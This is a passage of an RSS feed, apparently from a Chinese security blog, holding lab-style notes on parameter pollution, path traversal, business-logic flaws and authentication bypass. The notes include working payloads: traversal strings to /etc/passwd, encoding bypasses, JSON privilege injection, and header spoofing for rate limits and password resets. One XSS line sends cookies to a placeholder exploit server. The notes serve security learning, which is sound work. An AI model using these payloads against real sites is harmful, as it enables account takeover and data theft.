+</span></span></code></pre></div><p>内部 API 解析两个 <code>name</code> 参数。这取决于应用程序如何处理第二个参数，影响会有所不同。这在不同的网络技术中有所差异。比如：</p>
+<ul>
+<li>PHP 只解析最后一个参数。这将导致用户搜索 <code>carlos</code></li>
+<li>ASP.NET 会将两个参数合并。这将导致用户搜索<code>peter,carlos</code>，可能会出现<code>Invalid username</code> 的错误信息</li>
+<li>Node.js / express 只解析第一个参数。这将导致用户搜索 <code>peter</code>，结果保持不变</li>
+</ul>
+<p>如果能够覆盖原始参数，可能能够进行利用。比如，可以在请求中添加 <code>name=administrator</code>。这能够以管理员用户身份登录。</p>
+<p>例如，要以 <code>administrator</code> 的身份去删除一个账户，那先点击“忘记密码”。虽然没有邮箱，但是可以分析页面 <code>POST /forgot-password</code>。在提交的内容后面添加编码后的 <code>#</code> 和 <code>&amp;</code> 字符进行测试。发现 <code>&amp;filed=</code> 可用。那就用Burp自带的 <strong>Server-side variable names</strong> 表进行爆破。用爆破得到的值 <code>email</code> 填充，发现效果和没有<code>field</code>参数时的效果一样。那去查看调用的页面<code>forgotPassword.js</code>，发现发现会去url中拿 <code>reset-token</code> 这个参数，并填入到<code>GET</code>请求中。那将 <code>field</code> 参数赋值为 <code>reset_token</code>，响应里给出了<code>reset_token</code>的真实值。那据此构造<code>GET</code>请求，就能顺利更改密码。</p>
+<h3 id="测试-rest-路径">测试 REST 路径</h3>
+<p>RESTful API 可能会将参数名和值置于 URL 路径中，而非查询字符串。例如，考虑路径<code>/api/users/123</code>，URL 路径可以分解如下：</p>
+<ul>
+<li><code>/api</code>是根API端点</li>
+<li><code>/users</code>表示一种资源，在此例中为 <code>users</code></li>
+<li><code>/123</code>表示一个参数，这里是特定用户的标识符</li>
+</ul>
+<p>考虑一个应用程序，允许根据用户名编辑用户资料。请求发送到以下端点：</p>
+<p><code>GET /edit_profile.php?name=peter</code></p>
+<p>这导致了以下服务器端请求：</p>
+<p><code>GET /api/private/users/peter</code></p>
+<p>攻击者可能能够操控服务器端的 URL 路径参数来利用该 API。可以将 URL 编码的 <code>peter/../admin</code> 提交为 <code>name</code> 参数的值：</p>
+<p><code>GET /edit_profile.php?name=peter%2f..%2fadmin</code></p>
+<p>这可能导致以下服务器端请求：</p>
+<p><code>GET /api/private/users/peter/../admin</code></p>
+<p>如果服务器端客户端或后端API对该路径进行规范化，则可能解析为<code>/api/private/users/admin</code></p>
+<p>例如，与上面类似的场景，但只是在<code>&amp;</code>字符时提示有参数被截断。那将<code>username</code>参数值改为<code>./administrator</code>，发现正常显示，也就是解析了路径遍历。于是，采用路径遍历，发现5个<code>../</code>就移动到了api根路径之外。那就读取配置文件<code>../../../../openapi.json</code>，找到一个可用的api：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">api/internal/v1/users/{username}/field/{field}
+</span></span></code></pre></div><p>根据回显，<code>username</code>参数构造为<code>administrator/field/email%23</code>。然后出现了与上一题类似的场景：回显和之前一样。阅读<code>forgotPassword.js</code>文件，将<code>email</code>值改为参数<code>passwordResetToken</code>。但响应又提示不支持这个版本的API，那就用完整的api加上路径遍历：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&amp;username=../../../../api/internal/v1/users/administrator/field/passwordResetToken%23
+</span></span></code></pre></div><p>从而得到<code>passwordResetToken</code>的值。最后，按照<code>forgotPassword.js</code>文件中构造的路径，成功更改新密码。</p>
+<h3 id="结构化数据格式">结构化数据格式</h3>
+<p>攻击者可能能够操控参数，利用服务器处理其他结构化数据格式（如 JSON 或 XML）时的漏洞。为了测试这一点，可以向用户输入注入意想不到的结构化数据，看看服务器的响应。考虑一个应用程序，允许用户编辑个人资料，然后通过服务器端API请求应用更改。当编辑姓名时，浏览器会发出以下请求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">POST /myaccount name=peter
+</span></span></code></pre></div><p>这导致了以下服务器端请求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">PATCH /users/7312/update {&#34;name&#34;:&#34;peter&#34;}
+</span></span></code></pre></div><p>可以尝试将参数<code>access_level</code>添加到请求中，具体如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">POST /myaccount name=peter&#34;,&#34;access_level&#34;:&#34;administrator
+</span></span></code></pre></div><p>如果用户输入未经充分验证或净化就添加到服务器端 JSON 数据中，会导致以下服务器端请求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">PATCH /users/7312/update {name=&#34;peter&#34;,&#34;access_level&#34;:&#34;administrator&#34;}
+</span></span></code></pre></div><p>这可能导致用户<code>peter</code>获得管理员权限。</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>路径穿越</title>
+      <link>https://all-on.github.io/posts/web/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/</link>
+      <pubDate>Wed, 01 Apr 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/</guid>
+      <description>&lt;p&gt;路径遍历也称为目录遍历。这些漏洞使攻击者能够读取运行应用程序的服务器上的任意文件。&lt;/p&gt;
+&lt;h2 id=&#34;读取任意文件&#34;&gt;读取任意文件&lt;/h2&gt;
+&lt;p&gt;一个购物应用，显示待售商品图片。这可能会加载使用以下HTML的图片：&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<p>路径遍历也称为目录遍历。这些漏洞使攻击者能够读取运行应用程序的服务器上的任意文件。</p>
+<h2 id="读取任意文件">读取任意文件</h2>
+<p>一个购物应用，显示待售商品图片。这可能会加载使用以下HTML的图片：</p>
+<p><code>&lt;img src=&quot;/loadImage?filename=218.png&quot;&gt;</code></p>
+<p><code>loadImage</code> URL 接受一个 <code>filename</code> 参数，并返回指定文件的内容。图像文件存储在磁盘上的 <code>/var/www/images/</code>位置。要返回图像，应用程序将请求的文件名附加到该基目录，并使用文件系统 API 读取文件的内容。换句话说，应用程序从以下文件路径读取：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">images</span><span class="o">/</span><span class="mf">218.</span><span class="n">png</span>
+</span></span></code></pre></div><p>该应用程序未对路径遍历攻击实施任何防御。因此，攻击者可以请求以下 URL 从服务器的文件系统中检索 <code>/etc/passwd</code> 文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">insecure</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">loadImage</span><span class="err">?</span><span class="n">filename</span><span class="o">=../../../</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+</span></span></code></pre></div><p>在 Windows 上，<code>../</code> 和 <code>..\</code> 都是有效的目录遍历序列。以下是针对基于 Windows 的服务器的等效攻击示例：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">insecure</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">loadImage</span><span class="err">?</span><span class="n">filename</span><span class="o">=..</span>\<span class="o">..</span>\<span class="o">..</span>\<span class="n">windows</span>\<span class="n">win</span><span class="o">.</span><span class="n">ini</span>
+</span></span></code></pre></div><h2 id="绕过">绕过</h2>
+<p>许多将用户输入输入到文件路径中的应用程序，会实现对路径穿越攻击的防御。这些通常可以绕过。</p>
+<h3 id="绝对路径">绝对路径</h3>
+<p>遍历序列被绝对路径旁通阻断，传统的方式会显示文件不存在。因此，用文件系统根节点的绝对路径，比如 <code>filename=/etc/passwd</code>，直接引用文件，无需任何遍历序列。</p>
+<h3 id="非递归过滤">非递归过滤</h3>
+<p>如果是以非递归的方式将 <code>../</code> 替换为空，那么可以使用嵌套的遍历序列，比如 <code>....//</code> 或 <code>....\/</code>。当内层序列被剥离后，这些会恢复为简单的遍历序列。类似于双写绕过。</p>
+<h3 id="url-编码绕过">URL 编码绕过</h3>
+<p>在某些情况下，例如在 URL 路径中或在 <code>multipart/form-data</code> 请求的 <code>filename</code> 参数中，Web 服务器可能会在将输入传递给应用程序之前剥离任何目录遍历序列。有时可以通过对 <code>../</code> 字符进行 URL 编码，甚至双重 URL 编码来绕过这种类型的清理。这分别会得到 <code>%2e%2e%2f</code> 和 <code>%252e%252e%252f</code>。各种非标准编码，例如 <code>..%c0%af</code> （使用UTF-8 过长编码）或 <code>..%ef%bc%8f</code>（全角斜杠），也可能有效。</p>
+<h3 id="路径起始验证">路径起始验证</h3>
+<p>应用程序可能要求用户提供的文件名以预期的基文件夹开头，比如 <code>/var/www/images</code>。在这种情况下，可能包含所需的基础文件夹，并搭配合适的遍历序列。比如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">filename</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">images</span><span class="o">/../../../</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+</span></span></code></pre></div><p>例如，图片显示 <code>?filename=/var/www/images/8.jpg</code>，如果直接用 <code>?filename=../../../etc/passwd</code>，会提示 “Missing parameter &lsquo;filename&rsquo;”。这可不是因为缺少 <code>8.jpg</code>，而是因为图像存储的位置没有说清楚，也就是起始地址。</p>
+<h3 id="验证文件扩展名">验证文件扩展名</h3>
+<p>应用程序可能要求用户提供的文件名以预期的文件扩展名结尾，例如 <code>.png</code>。在这种情况下，可能可以使用空字节来在所需扩展之前有效终止文件路径。例如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">filename=../../../etc/passwd%00.png
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>业务逻辑漏洞</title>
+      <link>https://all-on.github.io/posts/web/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</link>
+      <pubDate>Sat, 28 Mar 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</guid>
+      <description>&lt;h2 id=&#34;对客户端控制的过度信任&#34;&gt;对客户端控制的过度信任&lt;/h2&gt;
+&lt;p&gt;一个根本错误的假设是用户只会通过提供的网页界面与应用交互。这尤其危险，因为它进一步假设客户端验证能防止用户提供恶意输入。&lt;/p&gt;
+&lt;p&gt;例如，在装入购物车的页面抓包，将货品价格从1337$ 改为0.01$，就能够支付成功。&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="对客户端控制的过度信任">对客户端控制的过度信任</h2>
+<p>一个根本错误的假设是用户只会通过提供的网页界面与应用交互。这尤其危险，因为它进一步假设客户端验证能防止用户提供恶意输入。</p>
+<p>例如，在装入购物车的页面抓包，将货品价格从1337$ 改为0.01$，就能够支付成功。</p>
+<h2 id="无法处理非常规输入">无法处理非常规输入</h2>
+<p>应用逻辑的一个目标是限制用户输入到符合业务规则的值。比如，数字数据类型可能接受负值。根据相关功能，业务逻辑可能不允许这样做。然而，如果应用程序未能进行足够的服务器端验证并拒绝该输入，攻击者可能能够传递负值，从而引发不想要的行为。</p>
+<h3 id="高级逻辑漏洞">高级逻辑漏洞</h3>
+<p>例如，在装入购物车的页面，发现没有 <code>price</code> 参数，只有 <code>quantity</code> 参数。把 <code>quantity</code> 参数改为负，结果金额不能为负。于是，再凑几件其他商品，控制金额就行。</p>
+<h3 id="低级逻辑缺陷">低级逻辑缺陷</h3>
+<p>例如，在装入购物车的页面，<code>quantity</code> 参数不能改为负数了。在 <code>intruder</code> 模块中爆破，发现一次最多放入的数量限制为99。再把<code>quantity</code> 参数设置为<code>99$$</code>，选择 <code>Null payloads</code>模式进行爆破。也就是不断添加99个数量。刷新页面，发现金额会在一定数量上变为负数。这是因为金额可能是用32位的 <code>int</code> ( <code>-2,147,483,648 ~ 2,147,483,647</code>)定义的。一旦金额值超过最大值，就会变为负数。于是，利用这一点，搭配其他商品，让总金额小于100而大于0即可。</p>
+<h3 id="特殊输入不一致">特殊输入不一致</h3>
+<p>例如，在一个绑定邮件地址的登录程序。先在主页面刷新，在Burp中找到 <code>Target-&gt;Engagement Tools-&gt;Discover Content</code>，点击 <code>Session is not running</code>，然后转到 <code>Site map</code> 模块就能看到有 <code>/admin</code> 这个网址。这个步骤就相当于智能化的dirsearch工具。进入 <code>/admin</code>，发现需要以DontWannaCry用户的身份进行登录。于是，注册一个账户，邮件地址就是给出的 <code>attacker@exploit-EMAILID.exploit-server.net</code>，在其中会收到确认链接。然后发现这个账户是没有用的，因为在注册页面就提示，管理员账户是 <code>@dontwannacry.com</code>。可是，我们并没有这样的邮箱，也就是收不到链接。只能考虑截断。注册时的邮件地址限制为255个字符，我们就让 <code>anything@dontwannacry.com</code> 刚好是255个字符，后面拼接已有的邮件地址 <code>.exploit-EMAILID.exploit-server.net</code>。这样就能够注册并登录成功。</p>
+<h2 id="对用户行为做出错误假设">对用户行为做出错误假设</h2>
+<h3 id="可信用户并不总是值得信赖">可信用户并不总是值得信赖</h3>
+<p>应用程序看似安全，是因为它们实施了看似强有力的执行业务规则的措施。不幸的是，一些应用程序犯了一个错误，认为通过这些严格控制后，用户及其数据可以被无限期地信任。这可能导致从那时起对相同管控的执行相对宽松。</p>
+<p>例如，如上的绑定邮件地址的登录程序。在常规登录页面，会提示管理员的邮件地址是 <code>@dontwannacry.com</code>。于是，常规登录，把邮件地址修改即可。</p>
+<h3 id="并不总是提供强制输入">并不总是提供强制输入</h3>
+<p>一个误解是用户总是会为强制输入字段提供值。浏览器可能会阻止普通用户在没有必要输入的情况下提交表单，但正如我们所知，攻击者可以在传输过程中篡改参数。这甚至延伸到完全移除参数。这适用于URL和参数 <code>POST</code>，但别忘了检查Cookie。</p>
+<p>例如，以普通用户的身份登录之后，要更改密码以用管理员身份登录。但是，在程序中，更改密码需要原密码，而我们并不知道管理员的密码。在测试过程中，发现原密码这个参数可以直接删除。于是，更改管理员的密码成功。</p>
+<h3 id="不遵循预期的顺序">不遵循预期的顺序</h3>
+<p>许多事务依赖于由一系列步骤组成的预定义工作流程。网页界面通常会引导用户完成这一流程，每次完成当前流程时都会引导他们进入下一步。然而，攻击者不一定会遵循这个预定的顺序。忽视这种可能性可能导致危险的缺陷，而这些缺陷相对容易被利用。</p>
+<p>例如，在购物时，先下单一件小商品，发现有一个确认页面 <code>/cart/order-confirmation?order-confirmed=true</code>。这个页面中并没有对购物车中的商品进行确认，也没有考虑余额是否足够。于是，把目标商品放入购物车之后，重放这个页面即可。</p>
+<p>再例如，登录的时候，会有两个页面：一个是正常的 <code>POST /login</code> 页面，另一个是选择角色的 <code>GET /role-selector</code> 页面。将后者丢弃，直接改为 <code>/admin</code> 页面，默认为管理员角色。</p>
+<h2 id="领域特定的缺陷">领域特定的缺陷</h2>
+<p>网店的折扣功能是寻找逻辑缺陷时的经典攻击面。这对攻击者来说可能是个宝藏，因为折扣的应用存在各种基本逻辑缺陷。比如，考虑一家网店对超过1000美元的订单提供10%折扣。如果业务逻辑未能检查折扣应用后订单是否被更改，这种机制可能容易被滥用。在这种情况下，攻击者可以将商品加入购物车，直到达到1000美元门槛，然后在下单前移除不想要的物品。即使订单不再符合预期标准，他们也会获得折扣。</p>
+<p>例如，在折扣页面，发现新登录的用户可以获得优惠券，主页下面还有对注册新闻订阅的优惠券。两种优惠券不断交替使用，足够把金额压缩。</p>
+<p>再例如，还是折扣的场景。如果用优惠券购买10美元的卡，只需花费7美元，而且兑换的礼物积分让整体余额增加到了103美元。也就是说，这套流程就是让余额增加的。那重复这套流程就行了。涉及到多个页面，可以选择用Burp intruder自动执行。首先确认需要的页面，有购物车页面（含有需要购买的卡） <code>POST /card</code>，提交优惠券页面 <code>POST /cart/coupon</code>，审查中转 <code>POST /cart/checkout</code>，提交订单并显示积分码 <code>GET /cart/order-confirmation?order-confirmed=true</code>，兑换积分 <code>POST /gift-card</code>，最后跳转到的账户页面 <code>GET /my-account</code>。然后添加一个宏进行自动执行。<code>Project options-&gt;Sessions-&gt;add</code>。<code>Scope</code>选项卡下，<code>URL Scope-&gt;Include all URLs</code>。<code>Details</code> 选项卡下，<code>Run actions-&gt;add-&gt;Run a macro-&gt;Select macro-&gt;add</code>，然后将上面的需要页面（除掉最后一个）都添加进去并确定。在已选的列表中，点击 <code>GET /cart/order-confirmation?order-confirmed=true</code>，<code>Configure item-&gt;add</code>，命名好参数（比如命名为 <code>gift-card</code>）并选中响应的积分码，确定；点击 <code>POST /gift-card</code>，<code>Configure item-&gt;Parameter handling</code>，把 <code>gift-card</code> 参数改为从先前的响应派生。接着可以测试一下宏是否成功。最后，把 <code>GET /my-account</code> 发送给 <code>intruder</code>，空转，注意需要自动执行的次数，并将资源池设置为1。解决。</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>认证</title>
+      <link>https://all-on.github.io/posts/web/%E8%AE%A4%E8%AF%81/</link>
+      <pubDate>Wed, 25 Mar 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/%E8%AE%A4%E8%AF%81/</guid>
+      <description>&lt;h1 id=&#34;基于密码的认证漏洞&#34;&gt;基于密码的认证漏洞&lt;/h1&gt;
+&lt;p&gt;在尝试暴力破解登录页面时，应该特别注意以下方面的任何差异：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;状态码&lt;/strong&gt;：在暴力破解攻击中，返回的HTTP状态码在绝大多数猜测中很可能相同，因为大多数猜测都是错误的。如果猜测返回不同的状态码，这强烈表明用户名是正确的。网站的最佳实践是无论结果如何，始终返回相同的状态代码，但这一做法并不总是被遵守。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;错误信息&lt;/strong&gt;：有时返回的错误信息会因用户名和密码都错误，还是只有密码错误而有所不同。网站在两种情况下使用相同、通用的信息是最佳实践，但有时会出现一些小的打字错误。即使渲染页面上不可见角色，只要有一个字符不对位，这两条消息就会区分开来。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;响应时间&lt;/strong&gt;：如果大多数请求的响应时间相似，任何偏离的请求都表明背后发生了其他事情。这又是一个暗示猜测用户名可能是正确的信号。例如，网站可能只有在用户名有效时才会检查密码是否正确。这一额外步骤可能会略微增加响应时间。这可能很微妙，但攻击者可以通过输入过长的密码来使网站处理时间明显更长，从而使延迟更加明显。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;用户名枚举&#34;&gt;用户名枚举&lt;/h2&gt;
+&lt;p&gt;用户名枚举是指攻击者能够观察网站行为的变化，以判断某个用户名是否有效。用户名枚举通常发生在登录页面，例如当你输入有效用户名但密码错误时，或者在注册表上，当你输入已被使用的用户名时。这大大减少了暴力破解登录所需的时间和精力，因为攻击者能够快速生成一份有效用户名的候选名单。&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h1 id="基于密码的认证漏洞">基于密码的认证漏洞</h1>
+<p>在尝试暴力破解登录页面时，应该特别注意以下方面的任何差异：</p>
+<ul>
+<li><strong>状态码</strong>：在暴力破解攻击中，返回的HTTP状态码在绝大多数猜测中很可能相同，因为大多数猜测都是错误的。如果猜测返回不同的状态码，这强烈表明用户名是正确的。网站的最佳实践是无论结果如何，始终返回相同的状态代码，但这一做法并不总是被遵守。</li>
+<li><strong>错误信息</strong>：有时返回的错误信息会因用户名和密码都错误，还是只有密码错误而有所不同。网站在两种情况下使用相同、通用的信息是最佳实践，但有时会出现一些小的打字错误。即使渲染页面上不可见角色，只要有一个字符不对位，这两条消息就会区分开来。</li>
+<li><strong>响应时间</strong>：如果大多数请求的响应时间相似，任何偏离的请求都表明背后发生了其他事情。这又是一个暗示猜测用户名可能是正确的信号。例如，网站可能只有在用户名有效时才会检查密码是否正确。这一额外步骤可能会略微增加响应时间。这可能很微妙，但攻击者可以通过输入过长的密码来使网站处理时间明显更长，从而使延迟更加明显。</li>
+</ul>
+<h2 id="用户名枚举">用户名枚举</h2>
+<p>用户名枚举是指攻击者能够观察网站行为的变化，以判断某个用户名是否有效。用户名枚举通常发生在登录页面，例如当你输入有效用户名但密码错误时，或者在注册表上，当你输入已被使用的用户名时。这大大减少了暴力破解登录所需的时间和精力，因为攻击者能够快速生成一份有效用户名的候选名单。</p>
+<p>例如，对用户名和密码进行直接爆破。</p>
+<h2 id="通过细微差别进行枚举">通过细微差别进行枚举</h2>
+<p>报错信息会有细微的差别，比如“Invalid username or password.”和“Invalid username or password”，一个标点符号。将它作为爆破的<code>grep extract</code>即可。</p>
+<h2 id="用户名通过响应时间枚举">用户名通过响应时间枚举</h2>
+<p>如果直接爆破会触发时间限制的保护机制；用户名正确时，密码越长响应时间越长。于是，考虑先爆破用户名，并且爆破时一次一个IP地址。在页面中加入<code>X-Forwarded-For</code>绕过IP检测，并将<code>X-Forwarded-For</code>与用户名一起爆破，采用“<code>PichFork</code>”模式。爆破成功之后再考虑密码</p>
+<p>从逻辑上讲，暴力破解保护的核心是尽可能简化自动化流程，并减缓攻击者尝试登录的速度。防止暴力破解攻击的两种最常见方法是：</p>
+<ul>
+<li>如果远程用户尝试登录失败过多次，就会锁定该账户</li>
+<li>如果远程用户连续多次登录尝试，则会阻断其IP地址</li>
+</ul>
+<p>两种方法提供不同程度的保护，但都不是刀枪不入，尤其是在采用有缺陷逻辑实现时。</p>
+<h2 id="突破ip封锁">突破ip封锁</h2>
+<p>如果连续提交3次错误登录请求，那么 IP 将被暂时阻止。其中任何一次登录成功计数器就会清零。这就很显然，将即将爆破的用户名和密码表，每隔一行插入已知的用户名或密码，然后进行爆破。注意，需要将资源池中的线程改为单线程，防止异步操作时让计数器不能准确清零。更改名单的示例如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;name.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="n">lines</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">        <span class="c1"># 保留原始换行符，再加 已知用户名wiener</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="n">lines</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># 确保原行干净</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="n">lines</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;wiener</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1"># 写入 1.txt</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;1.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">out_file</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">out_file</span><span class="o">.</span><span class="n">writelines</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
+</span></span></code></pre></div><h2 id="突破账户封锁">突破账户封锁</h2>
+<p>与普通登录错误一样，服务器响应显示账户被锁定，也有助于攻击者列举用户名。</p>
+<p>例如，当有效的账户连续登录五次失败后，就会将账户登录操作封锁1分钟。于是，对用户名和密码进行爆破的时候，将密码设置为<code>Null payloads</code>类型，数据为5次。也就是说，每一个用户名，都会以空密码进行5次尝试。时间最长的就是筛选出的用户名。最后爆破密码。</p>
+<h2 id="突破用户速率限制">突破用户速率限制</h2>
+<p>在这种情况下，短时间内发送过多登录请求会导致你的IP地址被封锁。通常，IP只能通过以下其中一种方式被解除拦截：</p>
+<ul>
+<li>在一定时间过去后自动生效</li>
+<li>管理员手动作</li>
+<li>用户在成功完成验证码后手动作</li>
+</ul>
+<p>由于限制基于用户IP地址发送的HTTP请求速率，有时如果能通过一次请求猜测多个密码，也能绕过这种防御。
+例如，如果以json格式来校验凭据，可以尝试使用数组请求多个密码。</p>
+<h1 id="其他认证机制中的漏洞">其他认证机制中的漏洞</h1>
+<p>除了基本的登录功能外，大多数网站还提供辅助功能，允许用户管理账户。例如，用户通常可以在忘记密码时更改或重置密码。这些机制还可能引入漏洞，攻击者可能利用这些漏洞。</p>
+<h2 id="暴力破解保持登录状态的cookie">暴力破解保持登录状态的cookie</h2>
+<p>一个常见功能是即使关闭浏览器会话后仍可保持登录状态。这通常是一个简单的复选框，比如“记住我”或“保持我登录”。</p>
+<p>这一功能通常通过生成某种“记住我”令牌实现，然后存储在持久的 Cookie 中。由于拥有这个Cookie可以让用户绕过整个登录流程，因此最好让这个Cookie不切实际地猜测。然而，有些网站基于可预测的静态数值串接生成该 cookie，如用户名和时间戳。有些甚至把密码作为Cookie的一部分使用。这种方法尤其危险，如果攻击者能够创建自己的账户，因为他们可以研究自己的Cookie，甚至推断其生成方式。一旦他们弄清楚了这个公式，就能尝试暴力破解其他用户的Cookie，从而访问他们的账户。</p>
+<p>例如，勾选保持登录状态选项之后，cookie中有一项stay-logged-in，生成过程是<code>base64(&quot;id:md5(password)&quot;)</code>。反向爆破即可</p>
+<h2 id="离线密码破解">离线密码破解</h2>
+<p>通过常规技术，如XSS，攻击者可以窃取另一用户的“记住我”cookie，并由此推断该cookie的构成。如果网站是基于开源框架构建的，Cookie构建的关键细节甚至可能被公开记录。</p>
+<p>例如，用户的密码哈希值存储在一个cookie中。实验室的评论功能中还包含一个XSS漏洞。于是，在评论中插入XSS攻击模板</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;script&gt;document.location=&#39;//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/&#39;+document.cookie&lt;/script&gt;
+</span></span></code></pre></div><p>随后在exploit sever的log中查找到stay-logged-in值，继续像上面那样采用base64解码后用md5尝试破解密码，登陆后操作即可。</p>
+<h2 id="密码重置逻辑错误">密码重置逻辑错误</h2>
+<p>更稳健的密码重置方法是向用户发送一个唯一的URL，引导他们进入密码重置页面。更好的实现方式是生成一个高熵、难以猜测的令牌，并据此创建重置URL。在最佳情况下，这个URL不应提示用户的密码被重置。当用户访问该URL时，系统应检查该令牌是否存在后台，如果存在，应重置哪个用户的密码。该令牌应在短时间内失效，密码重置后立即销毁。</p>
+<p>有些网站在提交重置表单时也未能再次验证令牌。在这种情况下，攻击者可以直接访问自己账户的重置表单，删除令牌，并利用该页面重置任意用户的密码。</p>
+<p>例如，数据包中的temp-forgot-password-token可以重复使用，当把temp-forgot-password-token的值删除后仍然可以成功修改密码。于是，开启代理，使用wiener用户操作找回密码的过程，在邮箱中获取到找回密码链接，输入新密码就可以重置密码成功。找到重置密码的数据包，放到repeater，用户名修改为carlos，发包，更改成功。</p>
+<h2 id="通过中间件的密码重置病毒">通过中间件的密码重置病毒</h2>
+<p>如果重置邮件中的URL是动态生成的，也可能受到密码重置中毒的风险。在这种情况下，攻击者可能会窃取其他用户的令牌并利用该令牌更改密码。</p>
+<p>例如，与上一个实验相比较而言，在重置密码的部分对temp-forgot-password-token值进行了校验，temp-forgot-password-token的值必须与用户对应才可以修改密码。在本实验中<code>X-Forwarded-Host</code>标头是受支持的，可以使用它来将动态生成的重置链接指向任意域。<strong><code>X-Forwarded-Host</code></strong> 用于记录客户端原始请求中的Host头内容，传递的是客户端请求的原始域名。
+于是，先用bp获取到忘记密码的POST 数据包，将此数据包发送到repeater，对数据包添加X-Forwarded-Host，指向漏洞服务器。在日志中可以看到返回的temp-forgot-password-token值。就用这个值替换重置密码的数据包中的temp-forgot-password-token值，进行设置的密码就是carlos的密码。登录，成功。</p>
+<h2 id="通过更改密码暴力破解">通过更改密码暴力破解</h2>
